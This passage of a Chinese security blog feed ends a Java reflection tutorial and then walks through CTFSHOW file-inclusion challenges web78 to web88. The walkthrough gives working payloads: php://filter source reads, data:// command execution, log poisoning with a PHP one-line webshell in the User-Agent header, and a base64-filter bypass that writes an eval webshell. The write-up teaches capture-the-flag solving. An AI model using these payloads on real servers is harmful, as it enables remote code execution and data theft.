class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person[name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(String act)</span>&#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String act)</span>&#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ReflectionTest类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">// 反射就是操作Class</span></span><br><span class="line">        <span class="comment">// Class是class的抽象，class是Class的实例</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">//c.newInstance();  //无参构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;SpongeBob&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面属性</span></span><br><span class="line">        Field[] public_personfields = c.getFields();<span class="comment">//获取公有的属性</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:public_personfields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] private_personfields = c.getDeclaredFields();<span class="comment">//获取私有和公有的属性</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:private_personfields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="string">&quot;Patrick&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        agefield.setAccessible(<span class="literal">true</span>);<span class="comment">//允许访问私有的属性</span></span><br><span class="line">        agefield.set(p,<span class="number">20</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">        Method[] personmethods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m:personmethods)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">showmethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;show&quot;</span>,String.class);</span><br><span class="line">        showmethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">displaymethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;display&quot;</span>, String.class);</span><br><span class="line">        displaymethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        displaymethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用类构造方法"><a href="#调用类构造方法" class="headerlink" title="调用类构造方法"></a>调用类构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c.newInstance();<span class="comment">// 无参构造方法</span></span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// c.getConstructor//获取类里面的构造方法，不同的参数会调用不同的构造方法，默认无参</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;SpongeBob&quot;</span>,<span class="number">19</span>);</span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_01.png" alt=""></p><h2 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method[] personmethods = c.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:personmethods)&#123;</span><br><span class="line">    System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_05.png" alt=""></p><p>也可以根据方法名获取方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取公有属性的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">showmethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;show&quot;</span>,String.class);</span><br><span class="line"><span class="comment">// 第一个参数为调用的方法名，第二个参数为方法的类型</span></span><br><span class="line">showmethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line"><span class="comment">// invoke：反射动态调用一个对象的方法</span></span><br><span class="line"><span class="comment">// 第一个参数为类的实例，第二个参数为方法的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取公有和私有属性的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">displaymethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;display&quot;</span>, String.class);</span><br><span class="line">displaymethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 允许访问私有的属性</span></span><br><span class="line">displaymethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_06.png" alt=""></p><h2 id="获取类属性"><a href="#获取类属性" class="headerlink" title="获取类属性"></a>获取类属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取公有的属性</span></span><br><span class="line">Field[] public_personfields = c.getFields();</span><br><span class="line"> <span class="keyword">for</span>(Field f:public_personfields)&#123;</span><br><span class="line">     System.out.println(f);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_02.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取私有和公有的属性</span></span><br><span class="line">Field[] private_personfields = c.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span>(Field f:private_personfields)&#123;</span><br><span class="line">    System.out.println(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_03.png" alt=""></p><p><strong>综上，我们发现加了<code>Declared</code>的，会把所有属性的变量都打印出来</strong></p><p>除此之外，还可以根据变量名来获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);<span class="comment">// 获取name属性</span></span><br><span class="line">namefield.set(p,<span class="string">&quot;Patrick&quot;</span>);<span class="comment">// 尝试改变name的值，第一个参数为要改变的类的实例，第二个参数为改变的值</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);<span class="comment">// 获取age私有属性</span></span><br><span class="line">agefield.setAccessible(<span class="literal">true</span>);<span class="comment">// 允许访问私有的属性</span></span><br><span class="line">agefield.set(p,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_04.png" alt=""></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>获取类的⽅法： <code>forName</code> </li><li>实例化类对象的⽅法： <code>newInstance</code> </li><li>获取函数的⽅法： <code>getMethod</code> </li><li>执⾏函数的⽅法： <code>invoke</code></li></ul><p><code>forName</code> 不是获取“类”的唯⼀途径，通常来说有如下三种⽅式获取⼀个“类”，也就是 <code>java.lang.Class</code> 对象：</p><ul><li><code>obj.getClass()</code> 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 <code>obj.getClass()</code> 来获取它的类 </li><li><code>Test.class</code> 如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接 拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。 </li><li><code>Class.forName</code> 如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取</li></ul><p>forName有两个函数重载：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code></li></ul><p>第⼀个就是最常⻅的获取class的⽅式，可以理解为第⼆种⽅式的⼀个封装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure><p>默认情况下， <code>forName</code> 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 <code>ClassLoader</code> </p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-文件包含</title>
      <link href="/2023/08/13/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/08/13/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web78-php-filter"><a href="#web78-php-filter" class="headerlink" title="web78(php://filter)"></a>web78(php://filter)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>平平无奇的文件包含，直接利用伪协议进行读取</p><p><code>paylaod: ?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data://)"></a>web79(data://)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪协议过滤，带有php的伪协议不能用了，但是可以利用其他伪协议</p><p>利用<code>data://</code></p><p>payload：</p><p><code>?file=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><h1 id="web80-日志"><a href="#web80-日志" class="headerlink" title="web80(日志)"></a>web80(日志)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可恶啊。<code>data://</code>也不让用了</p><p>可以实现日志包含</p><p><code>?file=/var/log/nginx/access.log</code></p><p>成功读取日志文件</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80.png" alt=""></p><p>将一句话木马写在UA头中，并测试</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80_01.png" alt=""></p><p>成功执行！</p><p>最终payload</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80_02.png" alt=""></p><h1 id="web81"><a href="#web81" class="headerlink" title="web81()"></a>web81()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>:</code>过滤了，但是不影响我们的日志包含</p><p>payload同上</p><h1 id="web82"><a href="#web82" class="headerlink" title="web82()"></a>web82()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次又禁用了<code>.</code>，所以包含无后缀的文件只有session文件</p><p>（<strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong>）</p><p>时间不在这区间，只能先放着，后续再来补充</p><h1 id="web83"><a href="#web83" class="headerlink" title="web83()"></a>web83()</h1><h1 id="web84"><a href="#web84" class="headerlink" title="web84()"></a>web84()</h1><h1 id="web85"><a href="#web85" class="headerlink" title="web85()"></a>web85()</h1><h1 id="web86"><a href="#web86" class="headerlink" title="web86()"></a>web86()</h1><h1 id="web87-die-和exit-死亡绕过"><a href="#web87-die-和exit-死亡绕过" class="headerlink" title="web87(die()和exit()死亡绕过)"></a>web87(die()和exit()死亡绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP在解码base64时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码</p><p>由于死亡之exit中的代码，字符<code>&lt;、?、;、&gt;、</code>空格等字符不符合base64解码范围，最终解码符合要求的只有<code>phpdie</code>这7个字符，而base64在解码的时候，是4个字节一组，因此还少两个，所以我们将这两个添加上去</p><ul><li>base64编码绕过：</li></ul><p><code>?file=php://filter/convert.base64-decode/resource=1.php&amp;content=aaPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p><p>因为题目还有个<code>urldecode</code>所以还要进行编码（编码两次）</p><p>密码为<code>1</code>，蚁剑连接，拿到flag</p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line">    </span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line"><span class="comment">// content内容为 aa+base64(&lt;?php eval($_POST[1]);)</span></span><br></pre></td></tr></table></figure><h1 id="web88"><a href="#web88" class="headerlink" title="web88()"></a>web88()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 